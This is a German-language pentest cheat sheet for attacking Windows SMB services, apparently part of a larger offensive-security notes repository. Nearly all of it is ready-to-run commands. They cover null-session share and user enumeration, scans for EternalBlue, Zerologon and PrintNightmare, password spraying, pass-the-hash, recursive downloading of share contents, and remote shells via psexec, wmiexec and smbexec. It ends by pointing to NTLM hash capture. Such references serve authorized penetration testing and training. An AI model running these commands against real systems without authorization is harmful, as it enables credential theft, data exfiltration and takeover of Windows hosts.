# 📁 SMB (139/445)

> SMB ist fast immer der erste Win in Pentests. Shares, User, Hashes — alles drin.

## Quick Check

```bash
# Shares listen (Null-Session)
smbclient -L //$RHOST/ -N
smbclient -L //$RHOST/ -U 'guest'

# Auf Share verbinden
smbclient //$RHOST/SHARENAME -N
smbclient //$RHOST/SHARENAME -U 'user%pass'

# Innerhalb von smbclient: ls, get, mget *, recurse ON, prompt OFF
```

## Volle Enumeration

```bash
# enum4linux (Klassiker)
enum4linux -a $RHOST
enum4linux-ng -A $RHOST       # neuere Variante, schöner

# nxc / netexec (Schweizer Taschenmesser)
nxc smb $RHOST
nxc smb $RHOST -u '' -p ''                    # Null-Session
nxc smb $RHOST -u 'guest' -p ''
nxc smb $RHOST -u 'user' -p 'pass' --shares
nxc smb $RHOST -u 'user' -p 'pass' --users
nxc smb $RHOST -u 'user' -p 'pass' --groups
nxc smb $RHOST -u 'user' -p 'pass' --pass-pol
nxc smb $RHOST -u 'user' -p 'pass' --rid-brute    # User-Liste!
nxc smb $RHOST -u 'user' -p 'pass' --shares --filter-shares READ WRITE

# rpcclient (Null-Session ausnutzen)
rpcclient -U "" -N $RHOST
# Drinnen:
> srvinfo
> enumdomusers
> enumdomgroups
> querydominfo
> getdompwinfo
> queryuser <RID>
```

## Vulns checken

```bash
# nmap NSE
nmap -p139,445 --script "smb-vuln-*" $RHOST
nmap -p445 --script smb-vuln-ms17-010 $RHOST       # EternalBlue
nmap -p445 --script smb-protocols $RHOST            # SMBv1?

# Spezifisch
nxc smb $RHOST -M ms17-010
nxc smb $RHOST -M zerologon
nxc smb $RHOST -M printnightmare
```

## Mit Creds

```bash
# Password Spraying
nxc smb $RHOST -u users.txt -p 'Winter2024!' --continue-on-success

# Pass-the-Hash
nxc smb $RHOST -u user -H <NTLM-HASH>

# Files runterladen
smbclient //$RHOST/SHARE -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'

# Shell wenn Admin (siehe Exploitation)
psexec.py user:pass@$RHOST
wmiexec.py user:pass@$RHOST
smbexec.py user:pass@$RHOST
```

## ➡️ Was als nächstes?

- Hash gefunden? → [Passwords](../../02-Exploitation/Passwords/README.md)
- Admin-Creds? → [Windows Exploitation](../../02-Exploitation/Windows/README.md)
- Schreibrechte auf Share? → SCF-File / WebDAV-Trick für NTLM-Hash-Capture
- Guest-lesbares Backup gefunden? → [PCAP & Forensik-Loot](../../04-Post-Exploitation/Loot-Sources/pcap-und-forensik-artefakte.md)
